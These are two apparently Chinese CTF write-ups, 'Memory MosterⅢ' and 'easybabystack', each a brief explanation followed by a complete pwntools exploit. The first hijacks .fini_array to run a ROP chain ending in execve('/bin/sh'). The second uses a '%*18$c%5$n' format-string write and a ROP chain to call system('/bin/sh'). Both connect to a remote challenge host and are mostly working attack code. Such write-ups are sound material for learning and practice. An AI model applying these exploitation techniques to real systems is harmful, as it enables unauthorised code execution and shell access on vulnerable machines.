docs.text: 原理和上一题相同，exp也是类似，只是gadget有一点区别。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \x00 ' ) sh . interactive ()
docs.title: Memory MosterⅢ

docs.text: 这道题利用了格式化字符串*的特性。 *可以用参数来计算占位符的宽度。如:%*2$c，就是用第二个参数的值来决定这个格式化字符的宽度。利用这一特性我们就可以输出和canary一样大小的字符进而用%n修改变量来bypass。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()
docs.title: easybabystack
